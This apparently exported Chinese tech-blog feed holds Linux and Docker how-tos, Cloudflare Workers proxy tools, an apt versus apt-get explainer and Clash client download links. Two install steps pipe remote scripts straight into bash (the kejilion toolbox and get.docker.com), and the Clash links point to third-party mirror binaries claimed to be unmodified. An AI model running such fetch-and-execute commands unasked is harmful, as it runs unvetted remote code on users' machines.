<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip FileName.zip          <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">zip FileName.zip DirName    <span class="comment"># 将DirName本身压缩 </span></span><br><span class="line"></span><br><span class="line">zip -r FileName.zip DirName <span class="comment"># 压缩，递归处理，将指定目录下的所有文件和子目录一并压缩</span></span><br></pre></td></tr></table></figure>

<h1 id="rar文件"><a href="#rar文件" class="headerlink" title=".rar文件"></a>.rar文件</h1><p>mac和linux并没有自带rar，需要去下载</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rar x FileName.rar      <span class="comment"># 解压 </span></span><br><span class="line"></span><br><span class="line">rar a FileName.rar DirName <span class="comment"># 压缩 .tar是打包</span></span><br></pre></td></tr></table></figure>

<p>.tar.gz才是压缩过的文件，</p>
<p>.tar.gz常见于unix系统，</p>
<p>在ubuntu或macos可以直接解压，</p>
<p>而.zip常见于windows系统</p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>centos</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>科技lion脚本工具</title>
    <url>/posts/c073f5ea/</url>
    <content><![CDATA[<p>科技Lion的Shell脚本工具是一款全能脚本工具箱，使用shell脚本编写。专为Linux服务器监控、测试和管理而设计。无论您是初学者还是经验丰富的用户，该工具都能为您提供便捷的解决方案。集成了独创的Docker管理功能，让您轻松管理容器化应用；LNMP建站解决方案能帮助您快速搭建网站，站点优化，防御，备份还原迁移一应俱全；并且整合了各类系统工具面板的安装及使用，使系统维护变得更加简单。我们的目标是成为全网最优秀的VPS一键脚本工具，为用户提供高效、便捷的科技支持。</p>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="安装基础组件"><a href="#安装基础组件" class="headerlink" title="安装基础组件"></a>安装基础组件</h3><p><strong>Debian&#x2F;Ubuntu</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update -y &amp;&amp; apt install -y curl</span><br></pre></td></tr></table></figure>

<p><strong>CentOS&#x2F;RedHat&#x2F;Fedora&#x2F;AlmaLinux&#x2F;Rocky Linux</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum update &amp;&amp; yum install -y curl</span><br></pre></td></tr></table></figure>

<p><strong>Alpine Linux</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apk update &amp;&amp; apk add curl</span><br></pre></td></tr></table></figure>

<h3 id="运行脚本"><a href="#运行脚本" class="headerlink" title="运行脚本"></a>运行脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -sL kejilion.sh)</span><br></pre></td></tr></table></figure>

<h2 id="脚本主界面"><a href="#脚本主界面" class="headerlink" title="脚本主界面"></a><strong>脚本主界面</strong></h2><p>脚本全面支持Ubuntu、Debian，Cent OS和Alpine Linux系统</p>
<p>只要执行命令自动获取最新版本</p>
<h2 id="主要功能"><a href="#主要功能" class="headerlink" title="主要功能"></a>主要功能</h2><h4 id="docker管理器"><a href="#docker管理器" class="headerlink" title="docker管理器"></a><strong>docker管理器</strong></h4><p>轻松安装管理你的docker容器，无需安装任何可视化面板。操作优雅直觉！</p>
<h4 id="LDNMP建站"><a href="#LDNMP建站" class="headerlink" title="LDNMP建站"></a><strong>LDNMP建站</strong></h4><p>LDNMP建站系统，超凡的快速建站方案，多站共存都是一键搞定。站点管理防护优化一应俱全。</p>
<h4 id="面板工具集合"><a href="#面板工具集合" class="headerlink" title="面板工具集合"></a><strong>面板工具集合</strong></h4><p>集合了时下流行的VPS面板应用程序，一键快速搭建。安装完成即可使用。安装后动态管理已安装的面板应用。</p>
<h4 id="系统工具集合"><a href="#系统工具集合" class="headerlink" title="系统工具集合"></a><strong>系统工具集合</strong></h4><p>集合了对Linux各项系统管理等基础操作，方便小伙伴优雅使用。调整VPS参数不需要记住繁琐命令，一键搞定。</p>
<h4 id="更多功能"><a href="#更多功能" class="headerlink" title="更多功能"></a><strong>更多功能</strong></h4><p>还有更多功能等待着大家自己发掘。欢迎提供宝贵意见，希望一键化脚本工具越来越强大。帮助小伙伴们使用VPS管理VPS。</p>
<p>转自<a href="https://blog.kejilion.pro/kejilion-sh/">科技lion一键脚本 Linux服务器运维工具箱 监控管理建站一个脚本全搞定！</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>kali</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
        <tag>centos</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>kali安装docker报错另一种方法解决</title>
    <url>/posts/9264edc1/</url>
    <content><![CDATA[<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -s https://get.docker.com/ | sh</span><br></pre></td></tr></table></figure>

<p>但是在执行该语句的过程中，会报错，内容是：</p>
<p>E: The repository ‘<a href="https://download.docker.com/linux/debian">https://download.docker.com/linux/debian</a> kali-rolling Release’ does not have a Release file.</p>
<p>试了很多方法，都没有用。比如：换源、更改将kali-rolling换成debain对应的别称等等，都没用。后来换了手动安装的方式，过程中没有出现任何问题。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install docker.io </span><br><span class="line"></span><br><span class="line">apt install docker-compose </span><br></pre></td></tr></table></figure>

<p>就这样，docker安装完成了。</p>
<p>补充：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动docker： </span></span><br><span class="line">service docker start</span><br><span class="line"></span><br><span class="line"><span class="comment">#停止docker： </span></span><br><span class="line">service docker stop</span><br><span class="line"></span><br><span class="line"><span class="comment">#查看docker状态：</span></span><br><span class="line">systemctl status docker</span><br><span class="line"></span><br><span class="line"><span class="comment">#开机自动启动</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker.service</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
        <category>os</category>
        <category>kali</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>CF-Workers-docker.io：Docker仓库镜像代理工具</title>
    <url>/posts/19a7202a/</url>
    <content><![CDATA[<p>项目地址：<a href="https://github.com/cmliu/CF-Workers-docker.io">https://github.com/cmliu/CF-Workers-docker.io</a></p>
<p>本项目是一个基于 Cloudflare Workers 的 Docker 镜像代理工具，旨在中转对 Docker 官方镜像仓库的请求，解决访问限制并加速访问。</p>
<h2 id="为什么需要这个工具？"><a href="#为什么需要这个工具？" class="headerlink" title="为什么需要这个工具？"></a>为什么需要这个工具？</h2><p>由于<strong>神秘原因</strong>，国内用户逐渐无法访问Docker Hub仓库。这对于开发者来说是个不小的难题。</p>
<p>而我的解决方案是通过<strong>赛博菩萨</strong>中转请求，解决访问限制并加速访问。</p>
<p>注意：<strong>不推荐使用该项目搭建公共服务</strong>。使用你自己的域名搭建公共服务有可能会遭受<strong>污染和反诈</strong>，推荐小规模自用即可。</p>
<hr>
<h2 id="部署方式"><a href="#部署方式" class="headerlink" title="部署方式"></a>部署方式</h2><p>访问<a href="https://github.com/cmliu/CF-Workers-docker.io">CF-Workers-docker.io：Docker仓库镜像代理工具</a>项目页面</p>
<ul>
<li><strong>Workers</strong> 部署：复制 <a href="https://github.com/cmliu/CF-Workers-docker.io/blob/main/_worker.js">_worker.js</a> 代码，<code>保存并部署</code>即可</li>
<li><strong>Pages</strong> 部署：<code>Fork</code> 后 <code>连接GitHub</code> 一键部署即可</li>
</ul>
<hr>
<h2 id="如何使用？"><a href="#如何使用？" class="headerlink" title="如何使用？"></a>如何使用？</h2><p>例如您的Workers项目域名为：<code>docker.fxxk.dedyn.io</code>；</p>
<h3 id="1-官方镜像路径前面加域名"><a href="#1-官方镜像路径前面加域名" class="headerlink" title="1.官方镜像路径前面加域名"></a>1.官方镜像路径前面加域名</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull docker.fxxk.dedyn.io/stilleshan/frpc:latest</span><br><span class="line"></span><br><span class="line">docker pull docker.fxxk.dedyn.io/library/nginx:stable-alpine3.19-perl</span><br></pre></td></tr></table></figure>

<h3 id="2-一键设置镜像加速"><a href="#2-一键设置镜像加速" class="headerlink" title="2.一键设置镜像加速"></a>2.一键设置镜像加速</h3><p>修改文件 <code>/etc/docker/daemon.json</code>（如果不存在则创建）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> -p /etc/docker</span><br><span class="line">sudo <span class="built_in">tee</span> /etc/docker/daemon.json &lt;&lt;-<span class="string">&#x27;EOF&#x27;</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [<span class="string">&quot;https://docker.fxxk.dedyn.io&quot;</span>]  <span class="comment"># 请替换为您自己的Worker自定义域名</span></span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>

<hr>
<h2 id="变量说明"><a href="#变量说明" class="headerlink" title="变量说明"></a>变量说明</h2><table>
<thead>
<tr>
<th>变量名</th>
<th>示例</th>
<th>必填</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>URL302</td>
<td><a href="https://macin.top/">https://macin.top</a></td>
<td>❌</td>
<td>主页302跳转</td>
</tr>
<tr>
<td>URL</td>
<td>nginx</td>
<td>❌</td>
<td>主页伪装(设为<code>nginx</code>则伪装为nginx默认页面)</td>
</tr>
</tbody></table>
<p>转载自<a href="https://cmliussss.com/p/CF-Workers-docker.io/">CMLiussss Blog - CM喂饭干货满满</a></p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>永不被盗的订阅转换方法！使用worker搭建永久免费的私人反代订阅转换服务</title>
    <url>/posts/7a74d415/</url>
    <content><![CDATA[<p>项目地址：<a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbjNDT3JQeGZuaWVqT2Y3T0Y3NGcwTjdublIyd3xBQ3Jtc0trR3c3Zm85UmlKeHA0S0p5N0k3Y1FnY0cwa2F5Nm1uV3AxdHJ5d21QcXFySWJBejVMUEttTUotbjBNWEFmemQwMC1MT0tHTWtCckdaZjFycF96emJuR3FGZm4zbV83cHQ0UjZPRkt5c0pvM0dVTDRPWQ&q=https://github.com/bulianglin/psub&v=X7CC5jrgazo">https://github.com/bulianglin/psub</a> </p>
<p>CF Worker：<a href="https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqbHRHY3h5MFJjcEJpTmxYT1NSMGFLeTlSNkF3UXxBQ3Jtc0tuTmhJQnAwWENqZGNwY0xLSnNiZVdKbTBNdXhlcExxVmVuMHRtaW1qNzRZTlhNbGdxOVE4aTZJVGw2OWJsTUt0WkR5ZHN4bHM2QVlzLWRIcGZtZ0J4aHlmbk5FTVpWejV3MnAzUDM5YlNlTkY0X19KQQ&q=https://cloudflare.com/&v=X7CC5jrgazo">https://cloudflare.com</a></p>
<h1 id="psub"><a href="#psub" class="headerlink" title="psub"></a>psub</h1><p>利用CF Worker搭建的反代订阅转换工具，通过随机化服务器地址和节点账号密码，解决用户转换订阅的隐私问题</p>
<h3 id="演示网站"><a href="#演示网站" class="headerlink" title="演示网站"></a>演示网站</h3><p><a href="https://psub.888005.xyz/">https://psub.888005.xyz</a></p>
<h3 id="视频教程"><a href="#视频教程" class="headerlink" title="视频教程"></a>视频教程</h3><p><a href="https://youtu.be/X7CC5jrgazo">https://youtu.be/X7CC5jrgazo</a></p>
<p>环境变量名：<code>BACKEND</code></p>
<p>KV或R2变量名：<code>SUB_BUCKET</code></p>
<h3 id="支持反代转换的协议"><a href="#支持反代转换的协议" class="headerlink" title="支持反代转换的协议"></a>支持反代转换的协议</h3><ul>
<li>shadowsocks</li>
<li>shadowsocksR</li>
<li>vmess</li>
<li>trojan</li>
<li>vless(取决于后端)</li>
<li>hysteria(取决于后端)</li>
</ul>
<h3 id="教程："><a href="#教程：" class="headerlink" title="教程："></a>教程：</h3><p>1.创建workers，重命名，部署</p>
<p>2.编辑代码</p>
<p>打开并复制下面的js代码，粘贴覆盖workers原本的演示代码，保存并部署</p>
<p> <a href="/img/worker.js">worker.js</a> </p>
<p>3.设置，变量，添加环境变量</p>
<p>变量和机密</p>
<p>为运行时使用的 Worker 定义环境变量和机密</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">名称</th>
<th align="center">值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">纯文本</td>
<td align="center">BACKEND</td>
<td align="center">先检查网上能用的后端网址再填入，例如：<a href="https://yun-api.subcloud.xyz/">https://yun-api.subcloud.xyz</a></td>
</tr>
</tbody></table>
<p>创建KV命名空间，重命名</p>
<p>绑定</p>
<p>定义 Worker 可用的资源集</p>
<table>
<thead>
<tr>
<th align="center">类型</th>
<th align="center">名称</th>
<th align="center">值</th>
</tr>
</thead>
<tbody><tr>
<td align="center">KV 命名空间</td>
<td align="center">SUB_BUCKET</td>
<td align="center">sub</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>proxy</category>
        <category>clash</category>
      </categories>
      <tags>
        <tag>proxy</tag>
        <tag>hack</tag>
        <tag>clash</tag>
        <tag>leak</tag>
      </tags>
  </entry>
  <entry>
    <title>apt和apt-get的区别（建议使用apt）</title>
    <url>/posts/2f16ba33/</url>
    <content><![CDATA[<p>Ubuntu 16.04 发布时，一个引人注目的新特性便是 apt 命令的引入。其实<strong>早在 2014 年，apt 命令就已经发布了第一个稳定版</strong>，只是直到 2016 年的 Ubuntu 16.04 系统发布时才开始引人关注。</p>
<p>随着 apt install package 命令的使用频率和普遍性逐步超过 apt-get install package，越来越多的其它 Linux 发行版也开始遵循 Ubuntu 的脚步，开始鼓励用户使用 apt 而不是 apt-get。</p>
<p>那么，apt-get 与 apt 命令之间到底有什么区别呢？如果它们有类似的命令结构，为什么还需要新的 apt 命令呢？是否 apt 真的比 apt-get 更好？普通用户应该使用新的 apt 命令还是坚持旧有习惯继续使用 apt-get 呢？</p>
<h3 id="apt与apt-get"><a href="#apt与apt-get" class="headerlink" title="apt与apt-get"></a>apt与apt-get</h3><p>在开始对比 apt 与 apt-get 命令的区别之前，我们先来看看这两个命令的背景，以及它们要试图达到的目的。</p>
<p>Debian 作为 Ubuntu、Linux Mint 和 elementary OS 等 Linux 操作系统的母板，其具有强健的「包管理」系统，它的每个组件和应用程序都内置在系统中安装的软件包中。Debian 使用一套名为 Advanced Packaging Tool（APT）的工具来管理这种包系统，不过请不要把它与 apt 命令混淆，它们之间是其实不是同一个东西。</p>
<p>在基于 Debian 的 Linux 发行版中，有各种工具可以与 APT 进行交互，以方便用户安装、删除和管理的软件包。apt-get 便是其中一款广受欢迎的命令行工具，另外一款较为流行的是 Aptitude 这一命令行与 GUI 兼顾的小工具。</p>
<p>如果你已阅读过我们的 <a href="https://www.sysgeek.cn/linux-package-management/">apt-get 命令指南</a>，可能已经遇到过许多类似的命令，如apt-cache、apt-config 等。如你所见，这些命令都比较低级又包含众多功能，普通的 Linux 用户也许永远都不会使用到。换种说法来说，就是最常用的 Linux 包管理命令都被分散在了 apt-get、apt-cache 和 apt-config 这三条命令当中。</p>
<p>apt 命令的引入就是为了解决命令过于分散的问题，它包括了 apt-get 命令出现以来使用最广泛的功能选项，以及 apt-cache 和 apt-config 命令中很少用到的功能。</p>
<p>在使用 apt 命令时，用户不必再由 apt-get 转到 apt-cache 或 apt-config，而且 apt 更加结构化，并为用户提供了管理软件包所需的必要选项。</p>
<p><strong>简单来说就是：apt &#x3D; apt-get、apt-cache 和 apt-config 中最常用命令选项的集合。</strong></p>
<h4 id="apt与apt-get之间的区别"><a href="#apt与apt-get之间的区别" class="headerlink" title="apt与apt-get之间的区别"></a>apt与apt-get之间的区别</h4><p>通过 apt 命令，用户可以在同一地方集中得到所有必要的工具，apt 的主要目的是提供一种以「让终端用户满意」的方式来处理 Linux 软件包的有效方式。</p>
<p>apt 具有更精减但足够的命令选项，而且参数选项的组织方式更为有效。除此之外，它默认启用的几个特性对最终用户也非常有帮助。例如，可以在使用 apt 命令安装或删除程序时看到进度条。</p>
<p>apt 还会在更新存储库数据库时提示用户可升级的软件包个数。</p>
<p>如果你使用 apt 的其它命令选项，也可以实现与使用 apt-get 时相同的操作。</p>
<h4 id="apt和apt-get命令之间的区别"><a href="#apt和apt-get命令之间的区别" class="headerlink" title="apt和apt-get命令之间的区别"></a>apt和apt-get命令之间的区别</h4><p>虽然 apt 与 apt-get 有一些类似的命令选项，但它并不能完全向下兼容 apt-get 命令。也就是说，可以用 apt 替换部分 apt-get 系列命令，但不是全部。</p>
<table>
<thead>
<tr>
<th align="left">apt 命令</th>
<th align="left">取代的命令</th>
<th align="left">命令的功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">apt install</td>
<td align="left">apt-get install</td>
<td align="left">安装软件包</td>
</tr>
<tr>
<td align="left">apt remove</td>
<td align="left">apt-get remove</td>
<td align="left">移除软件包</td>
</tr>
<tr>
<td align="left">apt purge</td>
<td align="left">apt-get purge</td>
<td align="left">移除软件包及配置文件</td>
</tr>
<tr>
<td align="left">apt update</td>
<td align="left">apt-get update</td>
<td align="left">刷新存储库索引</td>
</tr>
<tr>
<td align="left">apt upgrade</td>
<td align="left">apt-get upgrade</td>
<td align="left">升级所有可升级的软件包</td>
</tr>
<tr>
<td align="left">apt autoremove</td>
<td align="left">apt-get autoremove</td>
<td align="left">自动删除不需要的包</td>
</tr>
<tr>
<td align="left">apt full-upgrade</td>
<td align="left">apt-get dist-upgrade</td>
<td align="left">在升级软件包时自动处理依赖关系</td>
</tr>
<tr>
<td align="left">apt search</td>
<td align="left">apt-cache search</td>
<td align="left">搜索应用程序</td>
</tr>
<tr>
<td align="left">apt show</td>
<td align="left">apt-cache show</td>
<td align="left">显示装细节</td>
</tr>
</tbody></table>
<p>当然，apt 还有一些自己的命令：</p>
<table>
<thead>
<tr>
<th align="left">新的apt命令</th>
<th align="left">命令的功能</th>
</tr>
</thead>
<tbody><tr>
<td align="left">apt list</td>
<td align="left">列出包含条件的包（已安装，可升级等）</td>
</tr>
<tr>
<td align="left">apt edit-sources</td>
<td align="left">编辑源列表</td>
</tr>
</tbody></table>
<p>需要大家注意的是：apt 命令也还在不断发展， 因此，你可能会在将来的版本中看到新的选项。</p>
<h3 id="apt-get已弃用？"><a href="#apt-get已弃用？" class="headerlink" title="apt-get已弃用？"></a>apt-get已弃用？</h3><p>目前还没有任何 Linux 发行版官方放出 apt-get 将被停用的消息，至少它还有比 apt 更多、更细化的操作功能。对于低级操作，仍然需要 apt-get。</p>
<h3 id="我应该使用apt还是apt-get？"><a href="#我应该使用apt还是apt-get？" class="headerlink" title="我应该使用apt还是apt-get？"></a>我应该使用apt还是apt-get？</h3><p>既然两个命令都有用，那么我该使用 apt 还是 apt-get 呢？作为一个常规 Linux 用户，系统极客建议大家尽快适应并开始首先使用 apt。不仅因为广大 Linux 发行商都在推荐 apt，更主要的还是它提供了 Linux 包管理的必要选项。</p>
<p>最重要的是，apt 命令选项更少更易记，因此也更易用，所以没理由继续坚持 apt-get。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>最后结大家提供两点使用上的建议：</p>
<p>apt 可以看作 apt-get 和 apt-cache 命令的子集, 可以为包管理提供必要的命令选项。</p>
<p>apt-get 虽然没被弃用，但作为普通用户，还是应该首先使用 apt。</p>
<p>以上原文链接：<a href="https://www.sysgeek.cn/apt-vs-apt-get/">Linux中apt与apt-get命令的区别与解释 - 系统极客</a></p>
<p><strong>顺便补充下apt-get和yum区别：</strong></p>
<p>一般来说著名的linux系统基本上分两大类：</p>
<p>1、RedHat系列：Redhat、Centos、Fedora等</p>
<p>2、Debian系列：Debian、Ubuntu等</p>
<p>RedHat 系列 </p>
<p>1、常见的安装包格式 rpm包，安装rpm包的命令是“rpm -参数” </p>
<p>2、包管理工具 yum </p>
<p>3、支持tar包</p>
<p>Debian系列 </p>
<p>1、常见的安装包格式 deb包，安装deb包的命令是“dpkg -参数” </p>
<p>2、包管理工具 apt-get </p>
<p>3、支持tar包</p>
<p>tar 只是一种压缩文件格式，所以，它只是把文件压缩打包而已。 </p>
<p>rpm 相当于windows中的安装文件，它会自动处理软件包之间的依赖关系。 </p>
<p>优缺点来说，rpm一般都是预先编译好的文件，它可能已经绑定到某种CPU或者发行版上面了。 </p>
<p>tar一般包括编译脚本，你可以在你的环境下编译，所以具有通用性。 </p>
<p>如果你的包不想开放源代码，你可以制作成rpm，如果<a href="https://edu.csdn.net/cloud/pm_summit?utm_source=blogglc&spm=1001.2101.3001.7020">开源</a>，用tar更方便了。 </p>
<p>tar一般都是源码打包的软件，需要自己解包，然后进行安装三部曲，.&#x2F;configure, make, make install. 来安装软件。</p>
<p>rpm是redhat公司的一种软件包管理机制，直接通过rpm命令进行安装删除等操作，最大的优点是自己内部自动处理了各种软件包可能的依赖关系。</p>
]]></content>
      <categories>
        <category>os</category>
        <category>ubuntu</category>
        <category>debian</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>ubuntu</tag>
        <tag>debian</tag>
      </tags>
  </entry>
  <entry>
    <title>clash for windows &amp; linux 安装教程</title>
    <url>/posts/46074a5e/</url>
    <content><![CDATA[<p><code>Clash for Windows Github已删库,严格来讲它本来就是个闭源的产品，github只是个软件分发渠道而已，删库并不影响软件的使用,本站提供完整备份下载，目前仍然好用。如果您对删库有顾虑可以使用全开源替代品 clash-verge</code> <a href="https://clashforwindows.app/#clash-for-windows-%E6%9C%80%E4%BD%B3%E6%9B%BF%E4%BB%A3">🌟点击查看最佳替代</a></p>
<p>节点转换工具：<a href="https://v2rayse.com/node-convert">V2Ray节点转换工具 | 免费VPN节点分享与管理平台</a></p>
<p>另一个代理工具nekoray：<a href="https://github.com/Matsuridayo/nekoray/releases">Releases · MatsuriDayo&#x2F;nekoray</a></p>
<h2 id="Clash-介绍"><a href="#Clash-介绍" class="headerlink" title="Clash 介绍 #"></a>Clash 介绍 <a href="https://clashforwindows.app/#clash-%E4%BB%8B%E7%BB%8D"><em>#</em></a></h2><p>🚩Clash：一个 Go 语言开发的多平台代理客户端。<a href="https://github.com/Dreamacro/clash">Github</a></p>
<p>🚩ClashX：Clash 的 Mac 图形客户端。<a href="https://github.com/yichengchen/clashX">Github</a></p>
<p>🚩ClashForAndroid：Clash 的 Android 图形客户端。<a href="https://github.com/Kr328/ClashForAndroid">Github</a></p>
<p>🚩Clash for Windows：Clash 的 Windows&#x2F;macOS&#x2F;Linux 图形客户端。<del><a href="https://github.com/Fndroid/clash_for_windows_pkg">Github</a> 仓库地址已经删除。</del></p>
<h2 id="Clash-for-Windows-是什么？"><a href="#Clash-for-Windows-是什么？" class="headerlink" title="Clash for Windows 是什么？ #"></a>Clash for Windows 是什么？ <a href="https://clashforwindows.app/#clash-for-windows-%E6%98%AF%E4%BB%80%E4%B9%88"><em>#</em></a></h2><p>Clash for Windows是一款在 Windows 平台上专门设计的图形化网络代理工具，旨在帮助用户实现更加自由和安全的互联网访问。</p>
<p>它是基于开源项目 Clash 的一个分支，支持多种操作系统，包括 <code>Windows、macOS、Linux</code> 三大平台。</p>
<p>通过本文您可以快速掌握其使用Clash for Windows，接入国际互联网。</p>
<h2 id="Clash-for-Windows主要特点"><a href="#Clash-for-Windows主要特点" class="headerlink" title="Clash for Windows主要特点 #"></a>Clash for Windows主要特点 <a href="https://clashforwindows.app/#clash-for-windows%E4%B8%BB%E8%A6%81%E7%89%B9%E7%82%B9"><em>#</em></a></h2><ul>
<li><strong>多协议支持</strong>：Clash for Windows 支持多种代理协议，如 Vmess、Shadowsocks、Snell 和 SOCKS5，满足不同用户的需求。</li>
<li><strong>直观界面</strong>：用户界面简洁易用，即使是初学者也能快速上手。</li>
<li><strong>智能路由管理</strong>：通过灵活的规则配置，用户可以根据需求智能选择代理规则，确保网络行为的隐私和安全。</li>
<li><strong>高速稳定连接</strong>：利用智能路由和负载均衡技术，Clash for Windows 确保网络连接的稳定性和速度，适合浏览网页和观看视频。</li>
</ul>
<h2 id="Windows-Clash客户端"><a href="#Windows-Clash客户端" class="headerlink" title="Windows Clash客户端 #"></a>Windows Clash客户端 <a href="https://clashforwindows.app/#windows-clash%E5%AE%A2%E6%88%B7%E7%AB%AF"><em>#</em></a></h2><p>Clash 在 Windows 平台使用最流行的客户端有两款：Clash for Windows、Clash Verge：</p>
<ul>
<li>Clash for Windows<ul>
<li>官网：因未知原因，官方作者已移除官网及下载地址。</li>
<li>下载：<a href="https://clashforwindows.app/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8B%E8%BD%BD">点击前往下载</a></li>
<li>使用教程：<a href="https://clashforwindows.app/#%E5%90%AF%E5%8A%A8-clash-for-windows">点击查看</a></li>
</ul>
</li>
<li>Clash Verge Rev<ul>
<li>官网：<a href="https://github.com/Clash-Verge-rev/clash-verge-rev/">https://github.com/Clash-Verge-rev/clash-verge-rev/</a></li>
<li>下载：<a href="https://clash-verge.com/#%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8B%E8%BD%BD">点击前往下载</a></li>
<li>使用教程：<a href="https://clash-verge.com/">点击查看</a></li>
</ul>
</li>
</ul>
<h2 id="Clash-for-Windows客户端下载"><a href="#Clash-for-Windows客户端下载" class="headerlink" title="Clash for Windows客户端下载 #"></a>Clash for Windows客户端下载 <a href="https://clashforwindows.app/#clash-for-windows%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%B8%8B%E8%BD%BD"><em>#</em></a></h2><p><strong>📍📍 <code>不要安装到中文目录下、不要安装到中文目录下、不要安装到中文目录下</code></strong></p>
<p>目前 Clash for Windows 最新版本为 <strong>v0.20.39</strong>，下面是各个平台对应架构版本列表。</p>
<p>在Windows平台上如果您不知道自己的电脑是什么架构，那么喜欢安装版（装到电脑上程序列表能搜到）就 <a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.exe"><strong>下载安装版</strong></a> 喜欢绿色版（不用安装压缩包解压缩就能运行，部分功能可能会受限制）就 <a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-win.7z"><strong>下载绿色版</strong></a></p>
<p>如果是Mac或Linux平台，您可以直接从下面列表对应的平台下载安装程序。<strong>原厂备份，绝无修改，😂笑死根本不会改。</strong></p>
<table>
<thead>
<tr>
<th align="left">文件名</th>
<th>说明</th>
<th>下载</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Clash.for.Windows-0.20.39-arm64-linux.tar.gz</td>
<td>Linux ARM 64 位 版本 压缩包</td>
<td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-arm64-linux.tar.gz">下载</a></td>
</tr>
<tr>
<td align="left"><strong>⭐Clash.for.Windows-0.20.39-win.7z</strong></td>
<td>Windows 64 位 版本 压缩包</td>
<td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-win.7z">下载</a></td>
</tr>
<tr>
<td align="left">Clash.for.Windows-0.20.39-x64-linux.tar.gz</td>
<td>Linux 64 位 版本 压缩包</td>
<td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39-x64-linux.tar.gz">下载</a></td>
</tr>
<tr>
<td align="left">Clash.for.Windows-0.20.39.dmg</td>
<td>Mac 64 位 版本</td>
<td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows-0.20.39.dmg">下载</a></td>
</tr>
<tr>
<td align="left">Clash.for.Windows.Setup.0.20.39.arm64.exe</td>
<td>Windows ARM 64 位 版本</td>
<td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.arm64.exe">下载</a></td>
</tr>
<tr>
<td align="left"><strong>⭐Clash.for.Windows.Setup.0.20.39.exe</strong></td>
<td>Windows 64 位 版本</td>
<td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.exe">下载</a></td>
</tr>
<tr>
<td align="left">Clash.for.Windows.Setup.0.20.39.ia32.exe</td>
<td>Windows 英特尔 32 位 版本</td>
<td><a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_pkg/releases/download/Latest/Clash.for.Windows.Setup.0.20.39.ia32.exe">下载</a></td>
</tr>
</tbody></table>
<p>不习惯英文的可以下载第三方汉化版<a href="https://ghp.ci/https://github.com/clash-hub/clash_for_windows_chinese/releases/download/Latest/Clash.for.Windows-0.20.39-win-zh.7z">Clash for Windows 第三方汉化版</a> 。</p>
<p>📍📍 不过我一般是不推荐用汉化版本的，经过第三方修改，并不确定是否加藏私货，我们需要用的英文非常少，几乎不用懂英文就能使用原版。</p>
